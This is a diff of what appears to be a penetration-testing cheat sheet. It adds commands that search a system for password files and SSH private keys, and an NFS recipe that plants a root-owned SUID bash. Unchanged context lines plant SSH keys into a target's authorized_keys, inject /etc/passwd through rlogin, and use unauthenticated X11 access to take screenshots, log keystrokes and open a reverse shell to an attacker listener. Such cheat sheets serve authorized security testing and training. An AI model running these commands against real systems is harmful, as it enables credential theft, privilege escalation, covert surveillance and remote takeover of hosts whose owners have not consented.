@@ -239,6 +239,10 @@ cat /etc/exports
 - Search for exploits
 searchsploit linux kernel ubuntu 16.04
 
+- Search for passwords and keys
+find / -name "*password*"
+find / -name "id_rsa"
+
 - Check for bad permissions
 find / -perm -4000 2>/dev/null                             Binaries with the SUID bit set - run the file with permissions of its owner
 find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
@@ -594,7 +598,7 @@ tcpdump -w out.pcap -s 65535  'udp port 53'
 
 # Tunneling VNC over SSH
 
-OS X (awsv)                                     ssh -L 5901:localhost:5901 -i ~/.ssh/aws.pem ec2-user@host
+OS X (awsv)                                     ssh -i ~/.ssh/aws.pem ec2-user@host -L 5901:localhost:5901
 
 Remote Kali                                     sudo -i
                                                 vncserver -geometry 2560x1600
@@ -736,10 +740,10 @@ rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 
 # Anonymous Mountable CIFS
 
-mkdir /mnt/cifs/
-mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs
+mkdir /mnt/temp/
+mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/temp
 
-OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
+OS X: mount -t cifs //<target IP>:Users/<user> /mnt/temp/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
 
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -750,7 +754,11 @@ showmount -e <target IP>
 
 apt-get install nfs-common
 mkdir /mnt/temp/
-mount -t nfs -o nolock <target IP>:/<share> /mnt/temp/
+mount -t nfs <target IP>:/<share> /mnt/temp/ -o nolock
+cp /bin/bash .
+chown root bash
+chmod +s bash
+ls -la bash
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable SMB
@@ -774,27 +782,27 @@ rsysinfo <target IP>
 # X11 Unauthenticated Access
 
 - Enumeration
-nmap -Pn -n -T4 --open -p6000-6009 <targetIP>
+nmap -Pn -n -T4 --open -p6000-6009 <target IP>
 
 - Gather window info
-xwininfo -root -tree -display <targetIP:display #>
+xwininfo -root -tree -display <target IP:display #>
 
 - Capture screenshot
-xwd -root -screen -silent -display <targetIP:display #> > 1.xwd
+xwd -root -screen -silent -display <target IP:display #> > 1.xwd
 convert 1.xwd 1.png
 
 - Keylogger
-xspy -display <targetIP:display #>
+xspy -display <target IP:display #>
 If Kali's version doesnot work, you may need to compile from source https://github.com/mnp/xspy
 
 - Remotely view
-xwatchwin <targetIP:display #> -w <ID>
+xwatchwin <target IP:display #> -w <ID>
 
 - Remote Desktop
-xrdp.py <targetIP:display #>
+xrdp.py <target IP:display #>
 
 - Reverse shell
-xrdp.py <targetIP:display #> –no-disp
+xrdp.py <target IP:display #> –no-disp
 It will prompt a new control pane where we can see the R-shell option.
 nc -lvp 443
 Go back to the window and enter the attackerIP:port, then select R-Shell.
